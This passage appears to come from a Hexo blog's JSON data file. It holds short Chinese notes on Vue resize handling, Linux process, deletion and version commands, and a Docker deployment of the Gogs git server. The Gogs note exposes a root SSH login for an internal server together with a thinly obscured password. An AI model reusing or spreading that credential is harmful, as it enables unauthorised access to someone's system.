DOM渲染数据时，设置下背景图的高度．</span><br><span class=\"line\">    &gt; this.clientHeight.height = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．</span><br><span class=\"line\">    &gt; const that = this;</span><br><span class=\"line\">    &gt; window.onresize = function temp() &#123;</span><br><span class=\"line\">    &gt;     that.clientHeight = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    &gt; &#125;;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/qq_25386583/article/details/77161478\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"主要记录方案二：\"><a href=\"#主要记录方案二：\" class=\"headerlink\" title=\"主要记录方案二：\"></a>主要记录方案二：</h2><p>在vue 2.x 里面的时候，可以在 <code>mounted</code> 钩子中 全局监听 <code>resize</code> 事件，然后绑定的函数再做具体的处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">        clientHeight: &apos;600px&apos;,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">mounted() &#123;</span><br><span class=\"line\">    // 动态设置背景图的高度为浏览器可视区域高度</span><br><span class=\"line\"></span><br><span class=\"line\">    // 首先在Virtual DOM渲染数据时，设置下背景图的高度．</span><br><span class=\"line\">    &gt; this.clientHeight.height = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 然后监听window的resize事件．在浏览器窗口变化时再设置下背景图高度．</span><br><span class=\"line\">    &gt; const that = this;</span><br><span class=\"line\">    &gt; window.onresize = function temp() &#123;</span><br><span class=\"line\">    &gt;     that.clientHeight = `$&#123;document.documentElement.clientHeight&#125;px`;</span><br><span class=\"line\">    &gt; &#125;;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/qq_25386583/article/details/77161478\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"Linux-進程管理","date":"2018-05-05T08:00:24.000Z","archives":"Linux-進程管理","_content":"## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","source":"_posts/Operating System/UnixLike/Linux/Linux-進程管理.md","raw":"---\ntitle: Linux-進程管理\ndate: 2018-05-05 16:00:24\ntags: Linux-process\narchives: Linux-進程管理\ncategories: Linux\n---\n## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","slug":"Operating System/UnixLike/Linux/Linux-進程管理","published":1,"updated":"2018-09-05T06:33:18.497Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2y00exzodvq01veur9","content":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n"},{"title":"Linux命令行学习","date":"2018-06-21T09:04:39.000Z","_content":"# Linux主流命令\n\n## 显示当前路径\n````\npwd: 显示当前目录路径\n\ndirs: 显示当前目录路径\n````\n\n## 终端打开文件浏览窗口\n> nautilus .\n","source":"_posts/Operating System/UnixLike/Linux/Linux命令行学习.md","raw":"---\ntitle: Linux命令行学习\ndate: 2018-06-21 17:04:39\ntags: Cli\ncategories: Linux\n---\n# Linux主流命令\n\n## 显示当前路径\n````\npwd: 显示当前目录路径\n\ndirs: 显示当前目录路径\n````\n\n## 终端打开文件浏览窗口\n> nautilus .\n","slug":"Operating System/UnixLike/Linux/Linux命令行学习","published":1,"updated":"2018-09-27T03:18:58.211Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3000f1zodvzd1b16n0","content":"<h1 id=\"Linux主流命令\"><a href=\"#Linux主流命令\" class=\"headerlink\" title=\"Linux主流命令\"></a>Linux主流命令</h1><h2 id=\"显示当前路径\"><a href=\"#显示当前路径\" class=\"headerlink\" title=\"显示当前路径\"></a>显示当前路径</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwd: 显示当前目录路径</span><br><span class=\"line\"></span><br><span class=\"line\">dirs: 显示当前目录路径</span><br></pre></td></tr></table></figure>\n<h2 id=\"终端打开文件浏览窗口\"><a href=\"#终端打开文件浏览窗口\" class=\"headerlink\" title=\"终端打开文件浏览窗口\"></a>终端打开文件浏览窗口</h2><blockquote>\n<p>nautilus .</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux主流命令\"><a href=\"#Linux主流命令\" class=\"headerlink\" title=\"Linux主流命令\"></a>Linux主流命令</h1><h2 id=\"显示当前路径\"><a href=\"#显示当前路径\" class=\"headerlink\" title=\"显示当前路径\"></a>显示当前路径</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwd: 显示当前目录路径</span><br><span class=\"line\"></span><br><span class=\"line\">dirs: 显示当前目录路径</span><br></pre></td></tr></table></figure>\n<h2 id=\"终端打开文件浏览窗口\"><a href=\"#终端打开文件浏览窗口\" class=\"headerlink\" title=\"终端打开文件浏览窗口\"></a>终端打开文件浏览窗口</h2><blockquote>\n<p>nautilus .</p>\n</blockquote>\n"},{"title":"Vim大全","date":"2018-06-12T02:22:50.000Z","_content":"| Name | Academy | score |\n| - | :-: | -: | :-: |\n| Harry Potter | Gryffindor| 90 | \n| Hermione Granger | Gryffindor | 100 | \n| Draco Malfoy | Slytherin | 90 |","source":"_posts/Operating System/UnixLike/Linux/Vim大全.md","raw":"---\ntitle: Vim大全\ndate: 2018-06-12 10:22:50\ntags:\ncategories:\n---\n| Name | Academy | score |\n| - | :-: | -: | :-: |\n| Harry Potter | Gryffindor| 90 | \n| Hermione Granger | Gryffindor | 100 | \n| Draco Malfoy | Slytherin | 90 |","slug":"Operating System/UnixLike/Linux/Vim大全","published":1,"updated":"2018-09-05T06:33:18.499Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3200f3zodvkmuyqgn4","content":"<table>\n<thead>\n<tr>\n<th>Name</th>\n<th style=\"text-align:center\">Academy</th>\n<th style=\"text-align:right\">score</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Harry Potter</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n<tr>\n<td>Hermione Granger</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">100</td>\n</tr>\n<tr>\n<td>Draco Malfoy</td>\n<td style=\"text-align:center\">Slytherin</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<table>\n<thead>\n<tr>\n<th>Name</th>\n<th style=\"text-align:center\">Academy</th>\n<th style=\"text-align:right\">score</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Harry Potter</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n<tr>\n<td>Hermione Granger</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">100</td>\n</tr>\n<tr>\n<td>Draco Malfoy</td>\n<td style=\"text-align:center\">Slytherin</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"Linux 删除文件夹和文件的命令","date":"2018-04-28T08:32:00.000Z","archives":"删除命令","_content":"# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","source":"_posts/Operating System/UnixLike/Linux/linux 删除.md","raw":"---\ntitle: Linux 删除文件夹和文件的命令\ndate: 2018-04-28 16:32:00\ntags: Linux 删除命令\narchives: 删除命令\ncategories: Linux\n---\n# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","slug":"Operating System/UnixLike/Linux/linux 删除","published":1,"updated":"2018-09-05T06:33:18.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3400f7zodvet9i84ay","content":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n"},{"title":"查看Linux发行版核心","date":"2018-09-13T08:56:11.000Z","_content":"## Ubuntu查看系统版本-Linux内核版本\n\n````\nsudo lsb_release -a\n\ncat /etc/os-release\n\ncat /etc/redhat-release\n\nrpm -q centos-release\n\nuname -a\n\ncat /proc/version\n````\n\n---\n\n[转自CSDN](https://blog.csdn.net/haohaibo031113/article/details/70880864)\n\n[ubuntu 16.04 安装nginx](https://www.baidu.com/s?wd=ubuntu%2016.04%20%E5%AE%89%E8%A3%85nginx&rsv_spt=1&rsv_iqid=0xe793a65000001553&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=linux%25E6%259F%25A5%25E7%259C%258Bubuntu%25E7%2589%2588%25E6%259C%25AC&rsv_t=34e0PL5TYi1wHhbecCDMqieWCC0vKelIGuYW2od1EexG3UzWpfxhsOZUSlHq896i5PxNjA&inputT=11285&rsv_pq=bb5b65e700002916&rsv_sug3=46&rsv_sug1=44&rsv_sug7=101&rsv_sug2=0&prefixsug=ubuntu%252016.04%2520%25E5%25AE%2589%25E8%25A3%2585&rsp=3&rsv_sug4=11985)\n\n````\n> apt-get update // 升级集成软件包信息\n> apt-get upgrade // 升级 已经安装好的本级软件\n````\n","source":"_posts/Operating System/UnixLike/Linux/catLinuxCore.md","raw":"---\ntitle: 查看Linux发行版核心\ndate: 2018-09-13 16:56:11\ntags: catLinuxCore\ncategories: UnixLike\n---\n## Ubuntu查看系统版本-Linux内核版本\n\n````\nsudo lsb_release -a\n\ncat /etc/os-release\n\ncat /etc/redhat-release\n\nrpm -q centos-release\n\nuname -a\n\ncat /proc/version\n````\n\n---\n\n[转自CSDN](https://blog.csdn.net/haohaibo031113/article/details/70880864)\n\n[ubuntu 16.04 安装nginx](https://www.baidu.com/s?wd=ubuntu%2016.04%20%E5%AE%89%E8%A3%85nginx&rsv_spt=1&rsv_iqid=0xe793a65000001553&issp=1&f=3&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_4_dg&ch=1&rsv_enter=1&oq=linux%25E6%259F%25A5%25E7%259C%258Bubuntu%25E7%2589%2588%25E6%259C%25AC&rsv_t=34e0PL5TYi1wHhbecCDMqieWCC0vKelIGuYW2od1EexG3UzWpfxhsOZUSlHq896i5PxNjA&inputT=11285&rsv_pq=bb5b65e700002916&rsv_sug3=46&rsv_sug1=44&rsv_sug7=101&rsv_sug2=0&prefixsug=ubuntu%252016.04%2520%25E5%25AE%2589%25E8%25A3%2585&rsp=3&rsv_sug4=11985)\n\n````\n> apt-get update // 升级集成软件包信息\n> apt-get upgrade // 升级 已经安装好的本级软件\n````\n","slug":"Operating System/UnixLike/Linux/catLinuxCore","published":1,"updated":"2018-09-13T08:59:10.362Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3600fazodvwhl9ef4e","content":"<h2 id=\"Ubuntu查看系统版本-Linux内核版本\"><a href=\"#Ubuntu查看系统版本-Linux内核版本\" class=\"headerlink\" title=\"Ubuntu查看系统版本-Linux内核版本\"></a>Ubuntu查看系统版本-Linux内核版本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo lsb_release -a</span><br><span class=\"line\"></span><br><span class=\"line\">cat /etc/os-release</span><br><span class=\"line\"></span><br><span class=\"line\">cat /etc/redhat-release</span><br><span class=\"line\"></span><br><span class=\"line\">rpm -q centos-release</span><br><span class=\"line\"></span><br><span class=\"line\">uname -a</span><br><span class=\"line\"></span><br><span class=\"line\">cat /proc/version</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/haohaibo031113/article/details/70880864\" target=\"_blank\" rel=\"noopener\">转自CSDN</a></p>\n<p><a href=\"https://www.baidu.com/s?wd=ubuntu%2016.04%20%E5%AE%89%E8%A3%85nginx&amp;rsv_spt=1&amp;rsv_iqid=0xe793a65000001553&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=linux%25E6%259F%25A5%25E7%259C%258Bubuntu%25E7%2589%2588%25E6%259C%25AC&amp;rsv_t=34e0PL5TYi1wHhbecCDMqieWCC0vKelIGuYW2od1EexG3UzWpfxhsOZUSlHq896i5PxNjA&amp;inputT=11285&amp;rsv_pq=bb5b65e700002916&amp;rsv_sug3=46&amp;rsv_sug1=44&amp;rsv_sug7=101&amp;rsv_sug2=0&amp;prefixsug=ubuntu%252016.04%2520%25E5%25AE%2589%25E8%25A3%2585&amp;rsp=3&amp;rsv_sug4=11985\" target=\"_blank\" rel=\"noopener\">ubuntu 16.04 安装nginx</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; apt-get update // 升级集成软件包信息</span><br><span class=\"line\">&gt; apt-get upgrade // 升级 已经安装好的本级软件</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Ubuntu查看系统版本-Linux内核版本\"><a href=\"#Ubuntu查看系统版本-Linux内核版本\" class=\"headerlink\" title=\"Ubuntu查看系统版本-Linux内核版本\"></a>Ubuntu查看系统版本-Linux内核版本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo lsb_release -a</span><br><span class=\"line\"></span><br><span class=\"line\">cat /etc/os-release</span><br><span class=\"line\"></span><br><span class=\"line\">cat /etc/redhat-release</span><br><span class=\"line\"></span><br><span class=\"line\">rpm -q centos-release</span><br><span class=\"line\"></span><br><span class=\"line\">uname -a</span><br><span class=\"line\"></span><br><span class=\"line\">cat /proc/version</span><br></pre></td></tr></table></figure>\n<hr>\n<p><a href=\"https://blog.csdn.net/haohaibo031113/article/details/70880864\" target=\"_blank\" rel=\"noopener\">转自CSDN</a></p>\n<p><a href=\"https://www.baidu.com/s?wd=ubuntu%2016.04%20%E5%AE%89%E8%A3%85nginx&amp;rsv_spt=1&amp;rsv_iqid=0xe793a65000001553&amp;issp=1&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;rqlang=cn&amp;tn=98012088_4_dg&amp;ch=1&amp;rsv_enter=1&amp;oq=linux%25E6%259F%25A5%25E7%259C%258Bubuntu%25E7%2589%2588%25E6%259C%25AC&amp;rsv_t=34e0PL5TYi1wHhbecCDMqieWCC0vKelIGuYW2od1EexG3UzWpfxhsOZUSlHq896i5PxNjA&amp;inputT=11285&amp;rsv_pq=bb5b65e700002916&amp;rsv_sug3=46&amp;rsv_sug1=44&amp;rsv_sug7=101&amp;rsv_sug2=0&amp;prefixsug=ubuntu%252016.04%2520%25E5%25AE%2589%25E8%25A3%2585&amp;rsp=3&amp;rsv_sug4=11985\" target=\"_blank\" rel=\"noopener\">ubuntu 16.04 安装nginx</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; apt-get update // 升级集成软件包信息</span><br><span class=\"line\">&gt; apt-get upgrade // 升级 已经安装好的本级软件</span><br></pre></td></tr></table></figure>\n"},{"title":"linux下docker部署gogs git仓库","date":"2018-05-04T01:50:00.000Z","archives":"git仓库","_content":"# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[5个8]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","source":"_posts/Operating System/UnixLike/Linux/linux下docker部署gogs-git仓库.md","raw":"---\ntitle: linux下docker部署gogs git仓库\ndate: 2018-05-04 09:50:00\ntags: gogs docker\narchives: git仓库\ncategories: git\n---\n# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[5个8]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","slug":"Operating System/UnixLike/Linux/linux下docker部署gogs-git仓库","published":1,"updated":"2018-09-05T06:33:18.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry3900fezodvvkxamphc","content":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[5个8]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Pull image from Docker Hub.</span><br><span class=\"line\">$ docker pull gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Create local directory for volume.</span><br><span class=\"line\">$ mkdir -p /var/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker run` for the first time.</span><br><span class=\"line\">$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs</span><br><span class=\"line\"></span><br><span class=\"line\"># Use `docker start` if you have stopped it.</span><br><span class=\"line\">$ docker start gogs</span><br></pre></td></tr></table></figure>\n<p>配置文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">docker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"4-运行\"><a href=\"#4-运行\" class=\"headerlink\" title=\"4. 运行\"></a>4. 运行</h2><p>“<code>chmod +x gogs.docker</code>“: </p>\n<p>“<code>echo $PATH</code>“: 打印 环境变量</p>\n<p>“<code>./gogs.docker</code>“：启动服务</p>\n<h2 id=\"5-重启服务\"><a href=\"#5-重启服务\" class=\"headerlink\" title=\"5. 重启服务\"></a>5. 重启服务</h2><p><code>docker ps</code>获取<code>CONTAINER ID</code></p>\n<p><code>docker restart [19d724ea6ec9(ID)]</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[5个8]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" rel=\"noopener\">gogs-git官网 配置</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 